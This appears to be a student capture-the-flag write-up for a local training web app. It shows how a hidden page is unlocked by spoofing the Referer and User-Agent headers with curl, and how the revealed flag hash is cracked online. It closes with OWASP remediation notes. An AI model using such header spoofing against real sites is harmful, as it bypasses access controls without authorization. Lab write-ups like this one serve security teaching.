# Breach #3: Broken Access Control - HTTP Header Spoofing

## Vulnerability
The application attempts to restrict access to a hidden page by checking HTTP headers, but these are trivially spoofed client-side values.

## How It Works

1. **Discovery**: The footer link points to a suspicious hash-based page parameter:
```txt
?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```
However it is not a valid hash, but following the link 
`http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

without specifying special headers, it returns an "albatross" article page with hidden comments in a different index.php page which contains comments like :

```txt


<!--
Voila un peu de lecture :

Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.


-->



<!-- 

Fun right ?
source: loem.
Good bye  !!!!

-->
```

this one above is not very imformative but the next one is at line 520:

```txt
<!--
You must come from : "https://www.nsa.gov/".
-->
```

   ```txt
   <!-- You must come from : "https://www.nsa.gov/". -->
    ```

    and
    ```txt
    Let's use this browser : "ft_bornToSec". It will help you a lot.
   ```

what is the meaning behind this?

This is weak access control via HTTP headers! The page is checking:

Referer header - must be from https://www.nsa.gov/
User-Agent header - must include ft_bornToSec
These headers can be spoofed with curl:

```bash
curl -H "Referer: https://www.nsa.gov/" \
     -H "User-Agent: ft_bornToSec" \
     "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```


**Result**: Server returns the flag in the HTML response.

with curl I get a file with a flag now...
```txt
<!-- Main -->
<section id="main" class="wrapper">
<div class="container" style="margin-top:75px">
<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/>
```

in https://crackstation.net i get the flag for the hash which is 
`albatroz`

- **OWASP A01:2021 - Broken Access Control**: Insufficient authorization checks

- **Client-side validation only**: HTTP headers are completely under client control - never trust them
- **No real authentication**: Should use sessions, tokens, or server-side validation
- **Hint in comments**: The hints themselves reveal the exact bypass mechanism

